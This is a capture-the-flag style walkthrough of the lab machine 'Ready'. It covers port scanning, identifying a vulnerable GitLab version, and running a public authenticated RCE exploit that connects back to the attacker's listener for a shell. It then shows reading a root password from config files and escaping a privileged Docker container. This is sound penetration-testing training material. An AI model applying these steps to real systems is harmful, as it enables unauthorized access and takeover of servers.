## Ready

Difficulty: Medium

## User Flag

```
rustscan -a 10.10.10.220 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/b26854cb-e9dd-4e1e-99c0-c878a1dd4019)

<br>

In port 5080 there is a GitLab. Register and go to /help to find the version.

![GitLab Version](https://github.com/b1d0ws/OSCP/assets/58514930/3682eeb4-88ec-428b-a3d1-926fc468ce35)

<br>

There is two RCE exploits related to this GitLab version. I tried both of them and didn't work.

![searchsploit](https://github.com/b1d0ws/OSCP/assets/58514930/f49dffe7-12c1-4a39-94a3-e7ab1c0c29ad)

<br>

[This](https://github.com/mohinparamasivam/GitLab-11.4.7-Authenticated-Remote-Code-Execution) is the one that worked for me.

```
python3 gitlab_rce.py -U bido -P Bido192837 -l 10.10.14.3 -p 1337
```

![usingExploit](https://github.com/b1d0ws/OSCP/assets/58514930/414b891f-69f4-43ab-9778-6081f5e43700)

<br>

### Root Flag

LinPeas give us two interesting finds. The first one is related to files in root directory. Here we discover that we are inside a docker container.

![linPeasRoot](https://github.com/b1d0ws/OSCP/assets/58514930/535c6ec6-c350-49fb-b6e7-de4a1cc2b722)

<br>

There are also directories inside /opt. Looking through it, there are some configuration files and one of them has the root password.

![linPeasOpt](https://github.com/b1d0ws/OSCP/assets/58514930/7f95f9d8-9c9e-4dba-b99c-68e4311f1d6a)

![rootPassword](https://github.com/b1d0ws/OSCP/assets/58514930/cf670d26-8414-4bf3-ac35-f24beb5a005c)

<br>

Now that we are root, we can escape the docker mouting the /dev/sda2 partition. This is possible probably because the container has the [--privileged](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation) flag on its configuration.

![dockerEscape](https://github.com/b1d0ws/OSCP/assets/58514930/437dcb0b-9092-4e30-8f1d-d11a6a664a12)
